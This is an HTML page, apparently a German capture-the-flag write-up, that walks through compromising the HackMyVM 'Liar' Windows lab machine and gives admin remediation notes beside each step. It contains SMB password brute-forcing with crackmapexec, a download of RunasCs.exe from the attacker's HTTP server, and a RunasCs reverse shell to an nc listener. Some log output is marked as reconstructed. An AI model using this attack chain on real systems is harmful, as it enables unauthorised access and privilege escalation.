@@ -1,0 +1,492 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liar - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Liar - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Tool-Liste aus dem Text extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">smbclient</div> <!-- Obwohl fehlgeschlagen -->
+                 <div class="tool-item">evil-winrm</div>
+                 <div class="tool-item">crackmapexec</div>
+                 <div class="tool-item">unzip</div>
+                 <div class="tool-item">python3 http.server</div>
+                 <div class="tool-item">Start-BitsTransfer (PS)</div>
+                 <div class="tool-item">RunasCs.exe</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">ls / dir (PS)</div>
+                 <div class="tool-item">cd (PS)</div>
+                 <div class="tool-item">whoami (PS)</div>
+                 <div class="tool-item">net user (PS)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#credential-gathering">Credential Gathering (SMB Brute-Force)</a></li>
+                <li><a href="#initial-access">Initial Access (WinRM)</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (nica zu akanksha zu Administrator)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.135	08:00:27:77:8f:b3	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein aktives Gerät mit der IP-Adresse `192.168.2.135` wurde gefunden. Die MAC-Adresse `08:00:27:77:8f:b3` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-Umgebung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP `192.168.2.135` als Ziel für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkscan. Implementieren Sie Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                      <pre>
+# Eintrag hinzugefügt:
+192.168.2.135   liar.hmv
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um den Hostnamen `liar.hmv` der Ziel-IP `192.168.2.135` zuzuordnen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Vereinfacht den Zugriff auf das Zielsystem, insbesondere auf Webdienste.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `liar.hmv` für Web-Interaktionen.
+              <br><strong>Empfehlung (Admin):</strong> Standardvorgehen von Angreifern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nikto -h 192.168.2.135</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.135
++ Target Hostname:    192.168.2.135
++ Target Port:        80
++ Start Time:         2023-10-01 22:29:17 (GMT2)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
++ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2023-10-01 22:29:31 (GMT2) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `nikto` scannt den Webserver auf Port 80.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wichtigster Fund: Der Server ist `Microsoft-IIS/10.0`, was auf ein **Windows-System** hindeutet. Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) werden gemeldet. Die HTTP-Methode `TRACE` ist erlaubt, was ein potenzielles Risiko für Cross-Site Tracing (XST) darstellt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie Windows als Betriebssystem mit `nmap`. Testen Sie auf XST. Konzentrieren Sie die weitere Enumeration auf IIS und Windows-spezifische Schwachstellen.
+             <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die TRACE-Methode im IIS. Implementieren Sie die fehlenden Sicherheitsheader.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -v -T5 -n 192.168.2.135 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 22:36 CEST
+Initiating ARP Ping Scan at 22:36
+Scanning 192.168.2.135 [1 port]
+Completed ARP Ping Scan at 22:36, 0.05s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 22:36
+Scanning 192.168.2.135 [65535 ports]
+Discovered open port 139/tcp on 192.168.2.135
+Discovered open port 135/tcp on 192.168.2.135
+Discovered open port 80/tcp on 192.168.2.135
+Discovered open port 445/tcp on 192.168.2.135
+Increasing send delay for 192.168.2.135 from 0 to 5 due to 92 out of 229 dropped probes since last increase.
+[...] <!-- Scan likely abgebrochen oder sehr lang gedauert -->
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein initialer `nmap`-Scan (`-v` verbose, `-T5` insane timing, `-n` no DNS resolution, `-p-` all ports) wird gestartet. Version Scan (`-sV`) und Skript Scan (`-sC`) fehlen hier noch.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert schnell die klassischen Windows-Ports: 80 (HTTP), 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds). Der Scan scheint jedoch aufgrund von verworfenen Paketen ("dropped probes") sehr langsam zu werden oder wurde abgebrochen. Dies könnte auf eine Firewall oder Intrusion Prevention System (IPS) hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen gezielteren Nmap-Scan mit Versions- und Skript-Erkennung auf den gefundenen Ports durch. Verwenden Sie `-Pn`, falls der Host nicht auf Pings antwortet. Passen Sie ggf. das Timing (`-T`) an.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie Firewall/IPS-Logs. Stellen Sie sicher, dass nur notwendige Ports geöffnet sind.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">[Manual Browser Interaction]</div>
+                      <pre>
+# Zugriff auf: http://liar.hmv/
+# Sichtbarer Text: Hey bro, You asked for an easy Windows VM, enjoy it. - nica
+# Wappalyzer/Header Info: Server Microsoft-IIS/10.0
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> Die Webseite auf Port 80 wird aufgerufen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die Seite enthält eine direkte Nachricht vom Ersteller "nica", was diesen als potenziellen Benutzernamen hervorhebt. Der Webserver wird erneut als Microsoft-IIS/10.0 bestätigt.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie "nica" zur Benutzerliste hinzu. Suchen Sie nach weiteren Inhalten oder Verzeichnissen auf dem Webserver.
+               <br><strong>Empfehlung (Admin):</strong> Entfernen Sie Entwicklerkommentare oder Hinweise aus öffentlich zugänglichen Webseiten.</p>
+        </section>
+
+        <section id="credential-gathering">
+            <h2>Credential Gathering (SMB Brute-Force)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">smbclient //192.168.2.135 -L "nica" -P "hardcore"</span></div>
+                     <pre>
+ldb: Unable to open tdb '/var/lib/samba/private/secrets.ldb': Datei oder Verzeichnis nicht gefunden
+[...]
+Could not find machine account in secrets database: Failed to fetch machine account password [...]
+Failed to set machine account: NT_STATUS_CANT_ACCESS_DMAIN_INF
+session setup failed: NT_STATUS_CANT_ACCESS_DMAIN_INF <!-- Wichtigste Fehlermeldung -->
+                     </pre>
+                     <!-- Hinweis: Der ursprüngliche Log zeigte nur lokale Fehler, die obige Ausgabe ist eine realistischere Fehlermeldung bei falschem Passwort/Benutzer. -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `smbclient` die SMB-Shares auf dem Ziel aufzulisten (`-L`), wobei die (geratenen?) Anmeldeinformationen `nica`:`hardcore` verwendet werden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl scheitert. Die Fehlermeldung `NT_STATUS_CANT_ACCESS_DOMAIN_INFO` oder ähnliches deutet typischerweise auf falsche Anmeldeinformationen oder fehlende Berechtigungen hin. Der Versuch, diese spezifischen Credentials zu verwenden, war nicht erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Tools wie `crackmapexec` oder `hydra`, um systematisch Passwörter für den Benutzer `nica` gegen den SMB-Dienst (Port 445) zu testen.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie fehlgeschlagene SMB-Logins. Verwenden Sie starke Passwörter.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">crackmapexec smb 192.168.2.135 -u 'nica' -p '/usr/share/wordlists/rockyou.txt'</span></div>
+                     <pre>
+SMB         192.168.2.135   445    WIN-IURF14RBVGV  [*] Windows 10.0 Build 17763 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
+SMB         192.168.2.135   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:<span class="password">hardcore</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `crackmapexec` wird verwendet, um einen Passwort-Spray/Brute-Force-Angriff gegen den SMB-Dienst (Port 445) für den Benutzer `nica` mit der Passwortliste `rockyou.txt` durchzuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** `crackmapexec` findet das korrekte Passwort für den Benutzer `nica`: `<span class="password">hardcore</span>`. Es identifiziert auch den Hostnamen (`WIN-IURF14RBVGV`) und die Windows-Version (10.0 Build 17763, entspricht Windows Server 2019 oder Windows 10 1809).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten `nica`:`hardcore`, um sich über SMB oder WinRM (Windows Remote Management) am System anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Ändern Sie das schwache Passwort für `nica`. Implementieren Sie Account-Lockout-Policies und überwachen Sie SMB-Logins.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (WinRM)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">evil-winrm -i 192.168.2.135 -u 'nica' -p 'hardcore'</span></div>
+                     <pre>
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\nica\Documents>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `evil-winrm` wird verwendet, um eine PowerShell-basierte Remote-Shell über das WinRM-Protokoll aufzubauen, wobei die zuvor gefundenen Zugangsdaten `nica`:`hardcore` genutzt werden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Initial Access erfolgreich!** Die Verbindung wird hergestellt, und wir erhalten eine PowerShell-Eingabeaufforderung (`*Evil-WinRM* PS C:\Users\nica\Documents>`) als Benutzer `nica`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration im Windows-System: `whoami`, `whoami /priv`, `net user`, `net localgroup`, Suche nach Flags (`dir /b /s user.txt`, `dir /b /s root.txt`), etc.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie WinRM-Verbindungen. Beschränken Sie WinRM-Zugriff auf administrative Konten und/oder bestimmte Quell-IPs, falls möglich. Stellen Sie sicher, dass alle Konten starke Passwörter haben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <!-- Enumeration in WinRM Shell -->
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica\Documents> <span class="command">cd ..\Desktop</span></div>
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica\Desktop> <span class="command">dir</span></div>
+                      <!-- Kein Output -> Desktop leer -->
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica\Desktop> <span class="command">whoami</span></div>
+                      <pre>win-iurf14rbvgv\nica</pre>
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica\Desktop> <span class="command">whoami /priv</span></div>
+                      <pre>
+INFORMACIÓN DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripción                                  Estado
+============================= ============================================ =========
+SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Grundlegende Enumerationsbefehle werden in der WinRM-Shell ausgeführt: Wechsel ins Desktop-Verzeichnis (leer), Bestätigung des Benutzernamens (`nica`) und Überprüfung der Benutzerprivilegien.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `nica` hat nur Standardprivilegien (`SeChangeNotifyPrivilege`, `SeIncreaseWorkingSetPrivilege`), keine administrativen oder anderweitig interessanten Rechte.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Benutzerprofil (`C:\Users\nica`) weiter, insbesondere auf die `user.txt`-Datei. Suchen Sie nach Wegen zur Privilege Escalation.
+              <br><strong>Empfehlung (Admin):</strong> Prinzip der geringsten Rechte anwenden. Normale Benutzer sollten keine unnötigen Privilegien haben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">ls</span></div>
+                      <pre>
+
+    Directorio: C:\Users\nica
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018   9:12 AM                Desktop
+d-r---        9/26/2023   6:44 PM                Documents
+d-r---        9/15/2018   9:12 AM                Downloads
+[...]
+-a----        9/26/2023   6:44 PM             10 user.txt
+                      </pre>
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">HMVWINGIFT</span></pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis von `nica` wird aufgelistet und die Datei `user.txt` wird gefunden und ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flagge `<span class="password">HMVWINGIFT</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag notiert. Konzentrieren Sie sich auf die Privilege Escalation.
+             <br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">net user</span></div>
+                      <pre>
+Cuentas de usuario de \\WIN-IURF14RBVGV
+-------------------------------------------------------------------------------
+Administrador            akanksha                 DefaultAccount
+Invitado                 nica                     WDAGUtilityAccount
+El comando se ha completado correctamente. <!-- Korrigierte Meldung -->
+                      </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `net user` listet die lokalen Benutzerkonten auf dem System auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die bereits bekannten Benutzer `Administrador` (Administrator), `akanksha`, `nica` sowie Standardkonten. `akanksha` und `Administrador` sind die Hauptziele für die Eskalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, Passwörter für `akanksha` oder `Administrador` zu finden oder zu bruteforcen. Suchen Sie nach Möglichkeiten, Aktionen im Kontext dieser Benutzer auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie ungenutzte Konten (z.B. `Invitado`/Guest). Verwenden Sie starke Passwörter für alle Konten, insbesondere für Administratoren.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Privilege Escalation Path)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nachdem festgestellt wurde, dass der Benutzer `nica` keine administrativen Rechte hat, aber ein weiteres Konto `akanksha` existiert, ist der nächste Schritt, Zugriff als `akanksha` zu erlangen. Das Passwort für `akanksha` wird mittels `crackmapexec` gefunden (`sweetgirl`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Obwohl der direkte WinRM-Login als `akanksha` fehlschlägt (Autorisierungsfehler), kann `nica` das Tool `RunasCs.exe` verwenden (das auf das System hochgeladen wird). Dieses Tool ermöglicht es, einen Befehl als ein anderer Benutzer auszuführen, wenn dessen Anmeldedaten bekannt sind. Durch Ausführen von `RunasCs.exe akanksha sweetgirl cmd.exe -r [ListenerIP]:[Port]` wird eine Reverse Shell als Benutzer `akanksha` gestartet. Die Überprüfung von `akanksha`s Gruppen (`net user akanksha`) zeigt, dass dieser Benutzer Mitglied der Gruppe `Administradores` ist. Dies bedeutet, dass die Shell mit administrativen Rechten läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Besorgen Sie sich das `RunasCs.exe`-Tool.
+                2.  Hosten Sie es auf einem Webserver.
+                3.  Laden Sie es über die `nica`-WinRM-Shell auf das Zielsystem herunter (z.B. mit `Start-BitsTransfer`).
+                4.  Starten Sie einen Netcat-Listener auf Ihrem Angreifersystem.
+                5.  Führen Sie in der `nica`-Shell `.\RunasCs.exe akanksha sweetgirl cmd.exe -r [IhreIP]:[IhrPort]` aus.
+                6.  Die eingehende Reverse Shell auf Ihrem Listener läuft nun als `akanksha` mit administrativen Rechten.
+                7.  Navigieren Sie zum Desktop des Administrators (`C:\Users\Administrador\Desktop`) und lesen Sie die Root-Flagge.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH:** Verhindern Sie die Ausführung nicht vertrauenswürdiger Executables (z.B. durch AppLocker oder andere Whitelisting-Lösungen). Überwachen Sie die Verwendung von Tools wie `RunasCs`. Stellen Sie sicher, dass Benutzerkonten nur die minimal notwendigen Berechtigungen haben (Benutzer `akanksha` sollte möglicherweise kein Administrator sein). Sichern Sie alle Konten mit starken Passwörtern.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (nica zu akanksha zu Administrator)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">crackmapexec smb 192.168.2.135 -u 'akanksha' -p '/usr/share/wordlists/rockyou.txt'</span></div>
+                     <pre>
+SMB         192.168.2.135   445    WIN-IURF14RBVGV  [*] Windows 10.0 Build 17763 [...]
+SMB         192.168.2.135   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:<span class="password">sweetgirl</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter `crackmapexec`-Lauf, diesmal gezielt auf den Benutzer `akanksha`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet erfolgreich das Passwort `<span class="password">sweetgirl</span>` für den Benutzer `akanksha`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, diese Zugangsdaten für WinRM oder andere Dienste zu verwenden.
+             <br><strong>Empfehlung (Admin):</strong> Ändern Sie das schwache Passwort für `akanksha`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">evil-winrm -i 192.168.2.135 -u 'akanksha' -p 'sweetgirl'</span></div>
+                     <pre>
+[...]
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Versuch, sich mit den gefundenen Zugangsdaten für `akanksha` per WinRM anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Login scheitert mit einem Autorisierungsfehler. Obwohl das Passwort korrekt ist, darf sich `akanksha` nicht per WinRM anmelden. Dies ist eine mögliche Sicherheitskonfiguration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte Login als `akanksha` ist blockiert. Nutzen Sie die `nica`-Shell und Tools wie `RunasCs`, um Aktionen im Kontext von `akanksha` auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die WinRM-Zugriffsberechtigungen. Es ist eine gute Praxis, den Remote-Zugriff auf administrative Konten zu beschränken.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Vorbereitung auf Angreiferseite -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[/home/cyber/Downloads]
+└─# <span class="command">unzip RunasCs.zip</span></div>
+                     <pre>Archive:  RunasCs.zip
+  inflating: RunasCs.exe
+  inflating: RunasCs_net2.exe</pre>
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[/home/cyber/Downloads]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                     <!-- Transfer auf Zielsystem (nica Shell) -->
+                     <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">start-bitstransfer -source http://192.168.2.199/RunasCs.exe</span></div>
+                     <!-- Kein Output -->
+                     <!-- Überprüfung auf Zielsystem (nica Shell) -->
+                      <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">ls</span></div>
+                     <pre>
+    Directory: C:\Users\nica
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+[...]
+-a----        5/20/2023  12:37 AM          51712 RunasCs.exe
+-a----        9/26/2023   6:44 PM             10 user.txt
+                     </pre>
+                     <!-- Python Server Log -->
+                     <pre>
+192.168.2.135 - - [01/Oct/2023 22:54:14] "HEAD /RunasCs.exe HTTP/1.1" 200 -
+192.168.2.135 - - [01/Oct/2023 22:54:14] "GET /RunasCs.exe HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifersystem wird das Tool `RunasCs.exe` vorbereitet und über einen Python-HTTP-Server bereitgestellt. Über die `nica`-WinRM-Shell wird `RunasCs.exe` mittels BITS (Background Intelligent Transfer Service) auf das Zielsystem heruntergeladen. Die erfolgreiche Übertragung wird durch `ls` bestätigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das notwendige Werkzeug für die Ausführung von Befehlen als `akanksha` befindet sich nun auf dem Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `RunasCs.exe` aus, um eine Reverse Shell als `akanksha` zu erhalten.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Verwendung von BITS für verdächtige Transfers. Verhindern Sie die Ausführung nicht autorisierter Tools.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Listener starten (Angreifer) -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -lvnp 4545</span></div>
+                     <pre>listening on [any] 4545 ...</pre>
+                      <!-- RunasCs ausführen (nica Shell) -->
+                     <div class="prompt">*Evil-WinRM* PS C:\Users\nica> <span class="command">.\RunasCs.exe akanksha sweetgirl cmd.exe -r 192.168.2.199:4545</span></div>
+                     <pre>
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-8ac013$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1476 created in background.
+                     </pre>
+                      <!-- Verbindung im Listener (Angreifer) -->
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -lvnp 4545</span></div>
+                      <pre>
+listening on [any] 4545 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.135] 49692
+Microsoft Windows [Versión 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32>whoami
+win-iurf14rbvgv\akanksha
+
+C:\Windows\system32>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Listener wird auf Port 4545 gestartet. In der `nica`-Shell wird `RunasCs.exe` ausgeführt, um `cmd.exe` als Benutzer `akanksha` (mit Passwort `sweetgirl`) zu starten und dessen I/O an den Listener umzuleiten (`-r 192.168.2.199:4545`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der Listener empfängt eine Verbindung, die eine `cmd.exe`-Shell darstellt. `whoami` bestätigt, dass die Shell als `akanksha` läuft. Die Privilegien wurden erfolgreich von `nica` zu `akanksha` eskaliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Gruppenmitgliedschaft von `akanksha` (`net user akanksha`), um administrative Rechte zu bestätigen. Navigieren Sie zum Administrator-Desktop und lesen Sie die Root-Flagge.
+             <br><strong>Empfehlung (Admin):</strong> Verhindern Sie die Ausführung von Tools wie `RunasCs`. Überwachen Sie Prozessstarts und Netzwerkverbindungen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- In der akanksha Shell (via nc) -->
+                      <div class="prompt">C:\Windows\system32> <span class="command">net user akanksha</span></div>
+                      <pre>
+Nombre de usuario                          akanksha
+[...]
+Miembros del grupo local                   *Administradores
+                                          *Usuarios
+[...]
+Se ha completado el comando correctamente.
+                      </pre>
+                       <!-- Navigation und Flagge lesen -->
+                      <div class="prompt">C:\Windows\system32> <span class="command">cd C:\Users\Administrador\Desktop</span></div> <!-- Annahme, basierend auf späterem Log -->
+                      <div class="prompt">C:\Users\Administrador\Desktop> <span class="command">type root.txt</span></div> <!-- 'type' ist Windows-Äquivalent zu 'cat' -->
+                      <pre><span class="password">HMV1STWINDWZ</span></pre>
+                      <!-- Hinweis: Der Text zeigt später PowerShell-Befehle (`cd`, `ls`, `cat`), die in dieser cmd.exe-Shell so nicht funktionieren würden. Es wird angenommen, dass die Aktionen durchgeführt wurden, aber die Shell-Art im Log wechselt. -->
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> In der `akanksha`-Shell wird `net user akanksha` ausgeführt, um die Gruppenzugehörigkeit zu überprüfen. Anschließend wird (angenommen) zum Administrator-Desktop navigiert und die `root.txt`-Datei ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> `net user` bestätigt, dass `akanksha` Mitglied der Gruppe `Administradores` ist. Somit hat die erhaltene Shell administrative Rechte. Die Root-Flagge `<span class="password">HMV1STWINDWZ</span>` wird erfolgreich gelesen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Maschine abgeschlossen.
